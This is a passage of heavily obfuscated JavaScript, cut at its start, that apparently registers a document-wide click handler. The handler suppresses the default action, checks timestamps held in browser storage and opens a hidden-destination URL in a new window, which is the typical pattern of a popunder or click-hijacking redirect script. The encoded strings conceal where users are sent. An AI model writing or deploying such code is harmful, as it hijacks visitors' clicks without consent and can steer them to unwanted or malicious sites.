_0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());